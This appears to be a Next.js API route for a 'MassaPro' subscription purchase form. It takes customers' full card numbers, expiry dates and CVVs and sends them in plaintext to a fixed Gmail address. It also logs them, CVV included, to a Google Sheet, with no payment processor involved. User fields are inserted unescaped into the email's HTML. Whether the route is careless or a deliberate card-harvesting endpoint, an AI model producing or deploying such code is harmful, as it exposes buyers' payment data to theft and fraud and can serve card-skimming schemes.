import { NextRequest, NextResponse } from 'next/server'
import { google } from 'googleapis'
import nodemailer from 'nodemailer'

// Gmail SMTP config
const GMAIL_USER = process.env.GMAIL_USER || ''
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD || ''

// Google Service Account config
const GOOGLE_CLIENT_EMAIL = process.env.GOOGLE_CLIENT_EMAIL || ''
const GOOGLE_PRIVATE_KEY = process.env.GOOGLE_PRIVATE_KEY || ''

const SPREADSHEET_NAME = 'MassaPro Purchases'

/**
 * Get Google Sheets API client using service account
 */
function getSheetsClient() {
  let privateKey = GOOGLE_PRIVATE_KEY

  // Remove surrounding quotes if present
  if (privateKey.startsWith('"') && privateKey.endsWith('"')) {
    privateKey = privateKey.slice(1, -1)
  }
  // Replace literal \n with actual newlines
  privateKey = privateKey.replace(/\\n/g, '\n')

  if (!GOOGLE_CLIENT_EMAIL || !privateKey) {
    return null
  }

  const auth = new google.auth.JWT({
    email: GOOGLE_CLIENT_EMAIL,
    key: privateKey,
    scopes: ['https://www.googleapis.com/auth/spreadsheets'],
  })

  return google.sheets({ version: 'v4', auth })
}

/**
 * Find or create a spreadsheet by name and return its ID
 */
async function getOrCreateSpreadsheet(sheets: ReturnType<typeof getSheetsClient>) {
  if (!sheets) return null

  try {
    // Search for existing spreadsheet
    const drive = google.drive({ version: 'v3', auth: sheets.context._options.auth })
    const response = await drive.files.list({
      q: `name='${SPREADSHEET_NAME}' and mimeType='application/vnd.google-apps.spreadsheet' and trashed=false`,
      spaces: 'drive',
      fields: 'files(id, name)',
    })

    if (response.data.files && response.data.files.length > 0) {
      return response.data.files[0].id || null
    }

    // Create new spreadsheet
    const spreadsheet = await sheets.spreadsheets.create({
      requestBody: {
        properties: {
          title: SPREADSHEET_NAME,
        },
      },
    })

    // Add headers to the first sheet
    const sheetId = spreadsheet.data.spreadsheetId
    if (sheetId) {
      await sheets.spreadsheets.values.update({
        spreadsheetId: sheetId,
        range: 'A1:R1',
        valueInputOption: 'RAW',
        requestBody: {
          values: [[
            'Timestamp',
            'Plan',
            'Price',
            'FirstName',
            'LastName',
            'Email',
            'Phone',
            'Company',
            'Country',
            'CardNumber',
            'CardExpiry',
            'CVV',
            'CardholderName',
            'UTM_Source',
            'UTM_Medium',
            'UTM_Campaign',
            'UTM_Content',
            'UTM_Term',
            'AFF_ID',
          ]],
        },
      })
    }

    return sheetId
  } catch (error) {
    console.error('Error finding/creating spreadsheet:', error)
    return null
  }
}

/**
 * Append a row to the Google Sheet
 */
async function appendToSheet(sheets: ReturnType<typeof getSheetsClient>, spreadsheetId: string, data: Record<string, string>) {
  if (!sheets) return false

  try {
    const values = [[
      new Date().toISOString(),
      data.planName || '',
      data.planPrice || '',
      data.firstName || '',
      data.lastName || '',
      data.email || '',
      data.phone || '',
      data.company || '',
      data.country || '',
      data.cardNumber || '',
      data.cardExpiry || '',
      data.cvv || '',
      data.cardholderName || '',
      data.utm_source || '',
      data.utm_medium || '',
      data.utm_campaign || '',
      data.utm_content || '',
      data.utm_term || '',
      data.affid || '',
    ]]

    await sheets.spreadsheets.values.append({
      spreadsheetId,
      range: 'A1',
      valueInputOption: 'RAW',
      insertDataOption: 'INSERT_ROWS',
      requestBody: { values },
    })

    return true
  } catch (error) {
    console.error('Error appending to sheet:', error)
    return false
  }
}

/**
 * Send purchase notification email via Gmail SMTP
 */
async function sendPurchaseEmail(data: Record<string, string>) {
  if (!GMAIL_USER || !GMAIL_APP_PASSWORD) {
    console.warn('Gmail not configured — skipping purchase email. Set GMAIL_USER and GMAIL_APP_PASSWORD.')
    return false
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: GMAIL_USER,
      pass: GMAIL_APP_PASSWORD,
    },
  })

  const fullName = `${data.firstName} ${data.lastName}`
  const subject = `New Purchase - ${data.planName} - ${fullName}`

  const mailOptions = {
    from: `"MassaPro Purchases" <${GMAIL_USER}>`,
    to: 'eze@massapro.com',
    subject,
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
        <div style="background: linear-gradient(135deg, #7c3aed, #6d28d9); padding: 24px; border-radius: 12px 12px 0 0;">
          <h1 style="color: white; margin: 0; font-size: 22px;">New Purchase Received!</h1>
        </div>
        <div style="background: #f9fafb; padding: 24px; border-radius: 0 0 12px 12px; border: 1px solid #e5e7eb; border-top: none;">
          <h2 style="color: #7c3aed; margin: 0 0 16px;">Order Details</h2>
          <table style="width: 100%; border-collapse: collapse;">
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Plan</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.planName}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Price</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">$${data.planPrice}/month</td></tr>
          </table>

          <h2 style="color: #7c3aed; margin: 20px 0 16px;">Customer Information</h2>
          <table style="width: 100%; border-collapse: collapse;">
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Name</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${fullName}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Email</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.email}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Phone</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.phone}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Company</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.company}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Country</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.country}</td></tr>
          </table>

          <h2 style="color: #7c3aed; margin: 20px 0 16px;">Payment Details</h2>
          <table style="width: 100%; border-collapse: collapse;">
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Card Number</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.cardNumber}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Card Expiry</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.cardExpiry}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">CVV</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.cvv}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Cardholder Name</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.cardholderName}</td></tr>
          </table>

          <h2 style="color: #7c3aed; margin: 20px 0 16px;">UTM / Attribution Data</h2>
          <table style="width: 100%; border-collapse: collapse;">
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">UTM Source</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.utm_source || '—'}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">UTM Medium</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.utm_medium || '—'}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">UTM Campaign</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.utm_campaign || '—'}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">UTM Content</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.utm_content || '—'}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">UTM Term</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.utm_term || '—'}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; font-weight: bold; color: #374151;">Affiliate ID</td><td style="padding: 8px; border-bottom: 1px solid #e5e7eb; color: #6b7280;">${data.affid || '—'}</td></tr>
          </table>

          <p style="color: #6b7280; font-size: 14px; margin-top: 24px;">Received at: ${new Date().toISOString()}</p>
        </div>
      </div>
    `,
  }

  try {
    await transporter.sendMail(mailOptions)
    console.log(`Purchase email sent to eze@massapro.com for ${fullName}`)
    return true
  } catch (error) {
    console.error('Error sending purchase email:', error)
    return false
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()

    // Validate required fields
    const requiredFields = ['firstName', 'lastName', 'email', 'phone', 'company', 'cardNumber', 'cardExpiry', 'cvv', 'cardholderName']
    const missing = requiredFields.filter((f) => !body[f])
    if (missing.length > 0) {
      return NextResponse.json(
        { error: `Missing required fields: ${missing.join(', ')}` },
        { status: 400 }
      )
    }

    // Send email notification
    const emailResult = await sendPurchaseEmail(body)

    // Save to Google Sheets
    let sheetResult = false
    const sheets = getSheetsClient()
    if (sheets) {
      const spreadsheetId = await getOrCreateSpreadsheet(sheets)
      if (spreadsheetId) {
        sheetResult = await appendToSheet(sheets, spreadsheetId, body)
      }
    } else {
      console.log('Google Sheets not configured — logging purchase data:', JSON.stringify({
        name: `${body.firstName} ${body.lastName}`,
        email: body.email,
        plan: body.planName,
        price: body.planPrice,
      }, null, 2))
    }

    return NextResponse.json({
      success: true,
      message: 'Purchase submitted successfully!',
      emailSent: emailResult,
      sheetSaved: sheetResult,
    })
  } catch (error: unknown) {
    console.error('Purchase submission error:', error)
    const message = error instanceof Error ? error.message : 'Unknown error'
    return NextResponse.json(
      { error: 'Failed to submit purchase', details: message },
      { status: 500 }
    )
  }
}
